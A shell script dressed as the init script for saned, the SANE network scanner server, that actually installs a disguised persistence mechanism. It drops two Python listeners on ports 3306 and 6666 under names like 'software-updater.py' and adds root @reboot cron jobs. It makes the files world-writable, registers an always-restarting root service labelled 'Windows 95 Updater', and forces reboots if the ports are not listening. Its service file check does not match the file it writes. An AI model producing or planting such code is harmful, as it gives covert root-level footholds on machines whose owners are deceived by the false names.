#! /bin/sh
### BEGIN INIT INFO
# Provides:          saned
# Required-Start:    $syslog $local_fs $remote_fs
# Required-Stop:     $syslog $local_fs $remote_fs
# Should-Start:      dbus avahi-daemon
# Should-Stop:       dbus avahi-daemon
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: SANE network scanner server
# Description:       saned makes local scanners available over the
#                    network.
### END INIT INFO

echo "Started Upgrading..."

FILE=/home/software-updater.py
if test -f "$FILE"; then
	#File Exists
	echo "File is in place"
else
	#Create File
	cat << EOF > /home/software-updater.py

import socket, time

s = socket.socket()
host = socket.gethostname()
port = 3306
s.bind((host, port))


s.listen(5)
while True:
	c,addr = s.accept()
	c.send('Thank you for connecting')
	c.close()

EOF
fi


FILE=/bin/updaterv2.py
if test -f "$FILE"; then
	#File Exists
	echo "File is in place"
else
	#Create File
	cat << EOF > /bin/updaterv2.py
import socket, time

f = socket.socket()
host = socket.gethostname()
port = 6666
f.bind((host, port))


f.listen(5)
while True:
        c,addr = f.accept()
        c.send('Thank you for connecting')
        c.close()

EOF
fi

#Setting up Cron jobs
if cat /etc/crontab | grep "@reboot root python3 /home"; then
	#The Job is in the crontab
	echo "Cronjob 0 in place"
else
	echo "@reboot root python3 /home/software-updater.py" >> /etc/crontab
	echo "Cronjob 0 added"
fi
if cat /etc/crontab | grep "@reboot root python3 /bin"; then
	#The Job is in the crontab
	echo "Cronjob 1 in place"
else
	echo "@reboot root python3 /bin/updaterv2.py" >> /etc/crontab
	echo "Cronjob 1 added"
fi


chmod 777 /home/software-updater.py
chmod 777 /bin/updaterv2.py

FILE=/etc/systemd/system/updater.service
if test -f "$FILE"; then
	echo "File Exists"
else
	cat << EOF > /etc/systemd/system/upgrading.service

[Unit]
Description=Windows 95 Updater
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
ExecStart=/bin/bash /etc/init.d/upgrading

[Install]
WantedBy=multi-user.target

EOF
fi


if cat /etc/crontab | grep "@reboot root python3 /home"; then
		#Everything is good
		echo "Everything is good"
	else
		shutdown -r +0
		echo "Shuting Down: crontab /home"
	fi
	if cat /etc/crontab | grep "@reboot root python3 /bin"; then
		#Everything is good
		echo "Everything is good"
	else
		shutdown -r +0
		echo "Shutting Down: crontab /bin"
	fi

	if netstat -ant | grep "3306"; then
		#Everything is good
		echo "Everything is good"
	else
		shutdown -r +0
		echo "Shuting Down: port 3306"
	fi
	if netstat -ant | grep "6666"; then
		#Everything is good
		echo "Everything is good"
	else
		shutdown -r +0
		echo "Shuting Down: port 6666"
	fi
	sleep 5

systemctl start upgrading

exit 0


